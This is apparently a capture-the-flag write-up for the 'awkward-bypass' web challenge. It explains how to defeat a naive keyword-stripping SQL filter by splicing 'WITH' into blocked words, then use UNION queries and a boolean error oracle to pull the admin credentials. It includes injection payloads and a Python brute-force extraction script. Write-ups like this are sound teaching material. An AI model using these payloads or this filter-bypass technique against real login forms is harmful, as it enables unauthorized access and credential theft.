@@ -1,0 +1,138 @@
+The Website
+-----------
+going to the website shows us a basic login page with a username and password
+the form sends us to /user
+if we fail to login, the page just says "Error".
+
+
+
+The Source
+----------
+looking at the source, if we get the login right, it will display a page.  trying to GET the page will fail because it only uses POST.
+
+the login check goes out to a sql database and executes the following query
+SELECT * FROM users WHERE username='{username}' AND password='{password}'
+the query is filled in with python f strings.  our input isn't being escaped, so we can inject arbitrary SQL into this.
+
+
+
+Basic SQL Injection
+-------------------
+we can test our SQL inject to get a successful login with
+
+    user = ' OR 1=1 --
+    pass = junk
+
+this actually fails, because, looking back at the source, there is a blacklist trying to prevent SQL injection
+the blacklist consists of several SQL keywords.  the login parameters then are checked for each blacklisted word in alphabetical order and, if the word is found, it's removed from the string
+
+
+
+Bypassing the Filter
+-------------------
+it only does this blacklist pass once, and because it's alphabetical, we can just put one of the last words, "WITH", in the middle of any blacklist words we want in our query.  The single instance of the word will be found and removed, leaving the rest of the query.
+
+    user = ' OWITHR 1=1 --
+
+and this works, but we're met with a page telling us there is no flag here.
+well, we have the ability to execute arbitrary SQL, so let's see what else is in the database...
+
+
+
+Boolean SQL Oracle
+-----------------
+while we can execute arbitrary SQL, we aren't presented with the output of our queries.  We are, however, presented with either an Error or the user page if our query returns any results.  So we can use this binary result to determine truth values about various properties of the data in the database including existence of tables, rows in those tables, count of records, existence of specific records, and even figure out the content of records with carefully crafted queries
+
+
+
+Arbitrary SQL Injection through UNIONs
+--------------------------------------
+there are any number of ways to go about this, but I personally prefer turning the original query into a guaranteed no results query and UNION it with an arbitrary query of my choice so that I have full control of the query and not just statements after the WHERE clause like in a traditional SQL injection
+
+    user = ' UNION <arbitrary query> --'
+
+in order to do a UNION, though, we need to SELECT the same number of rows as the table in the original query.  So we need to figure out how many rows are in users.  We can do this pretty easily by selecting on an increasing number of NULL rows until we get a successful query.  We know we have at least 2 rows, so we can start there. also, remember that we need to insert "WITH" in the middle of each of our SQL keywords.  Here on I'm going to omit it from the examples for the sake of readability.
+
+    user = ' UNION SELECT NULL, NULL --
+
+and... there are only 2 rows.  So it's just the user and password fields.
+
+
+
+Searching for tables in sqlite_master
+-------------------------------------
+first of all, we want to check for the existence of any other tables. in SQLite, there is a sqlite_master table that has a record for each user-created tables. I decided to check for how many tables there were first by predicating my query on COUNT(*) and searching for the right number with >. You have to use a HAVING clause to predicate on COUNT(*).  You need a GROUP BY clause in order to use the HAVING clause.  note that we need to insert the "WITH" between the 'R' and 'O' in FROM rather than the 'O' and 'M' because then we'll accidentally spell "ROW" and we need to insert a "WITH" in sqlite_master becaues it contains "as", so sqlite_maWITHster
+
+    user = ' UNION SELECT COUNT(*), NULL FROM sqlite_master GROUWITHP BWITHY 1=1 HAVIWITHNG COUNT(*) > 1 --
+
+and... this comes back false.  checking COUNT(*) == 1 instead and... yeah.  users is our only table.
+
+
+
+Searching for users in the users table
+--------------------------------------
+okay... so how many records are in the users table? we can check this in the same way
+
+    user = ' UNION SELECT COUNT(*), NULL FROM users GROUP BY 1=1 HAVING COUNT(*) > 1
+
+and... we only have a single record.  okay, well let's figure out what the exact values of the two rows in that record are.
+
+
+
+sqlmap-esque attack to brute force a value in a record
+------------------------------------------------------
+The most straightforward way to do this is by using the LIKE clause.  We can search each character individually and match the rest of the string with %.  So we could test username LIKE 'a%', username LIKE 'b%', etc. until we find a match, then add another character username LIKE 'ua%' and so on until we have the whole thing.
+
+There is one catch, though.  if we ever run into something in the value we're testing that is in the blacklist, it can mess up our query leading us missing a match or getting a false positive.  My original attempt at this had an issue where it would keep matching fififififi... indefinitely because the "if" was being filtered out.  I got around it by figuring out the length of the field and searching using only single character wildcards, but honestly that's not a great way to handle it.  A better way is to just do what we've been doing.  Add a "WITH" between each character to ensure no matches happen.  Potentially the "WITH" could make a match with something else in the string, but it's unlikely and we'll deal with it if we run into it (spoilers, we don't)
+
+The last catch is that we need to deal with any '_' that we find.  '_' is also a single character wildcard in a SQL LIKE clause, so we need to escape it.  We can do this by adding an ESCAPE clause to define an escape character like '!' and then escaping the '_' with '!_'
+
+    user = ' UNION SELECT username, NULL FROM users WHERE username LIKE '<test characters>%' ESCAPE '!' --
+
+Our script has an outer loop that keeps going until we have a character that we can't find a match for (implying the end of the string).  The inner loop iterates over several printable characters that we might find in the string. We skip a couple characters that have semantics in the LIKE statement and aren't likely to be part of the string.  We might have '_', though, so when we check it, change it to a '!_'.  We prepend the string that we've found so far to the character we're checking and then add "WITH" between each character.  Test it, check if it's an Error or not, and if it isn't, add it to the currently discovered string, break, and start checking the next character.
+
+```
+import string
+import request
+base = '\' UNIOWITHN SELECWITHT username, NUWITHLL FRWITHOM users WHERWITHE '
+base += 'username LIWITHKE \''
+#base += 'paWITHsswoWITHrd LIWITHKE \''
+tail = '%\' ESCORAPE \'!\' --'
+soln = ''
+while True :
+    found = False
+    for c in string.printable[:95]:
+        ch = c
+        if ch in '%[]^-!':
+            continue
+        if ch == '_':
+            ch = '!_'
+        test = soln + ch
+        test = 'WITH'.join(test)
+        payload = base + test + tail
+        code = 400
+        while code != 200:
+            r = requests.post("https://awkward-bypass.chal.imaginaryctf.org/user",data={'username':payload,'password':'test'})
+            code = r.status_code
+        log = soln+c
+        print(log+": " if "Error" in r.text else log+": ***********")
+        if not "Error" in r.text :
+            found = True
+            soln += c
+            break
+    if not found:
+        break
+```
+
+and "admin" is our username.  Okay, what about the password?  We can do the exact same thing except with the password field.  The only thing to be aware of is that "password" actually has two blacklist matches in it.  So instead, we want to use "paWITHsswoWITHord".
+
+this eventually gets us the flag.
+
+
+
+Alternative Methods
+-------------------
+while this is the most straightforward way to do this, I saw a few other really cool ideas to figure out a field in other writeups that are worth mentioning here.
+one interesting idea was to use the SQL substr and hex functions to get a single character in the string, convert it to hex, and compare it to the hex of the character we're testing. We can then send that character individually to avoid running into the blacklist and as hex to avoid special characters in the LIKE clause.
+
+another cool idea was to first figure out the length of the string.  then, in our loop to crack the value, we convert the entire string to hex and compare it to a value in the range of 0 to hex(256**string_length). Since we can check < rather than strictly ==, we can actually do a binary search on the number.  Not only would that binary search be way faster than iterating over every possible character, but this would let us check the whole string at once which should also be much faster.  And the hex means we won't run into blacklist words or special characters.
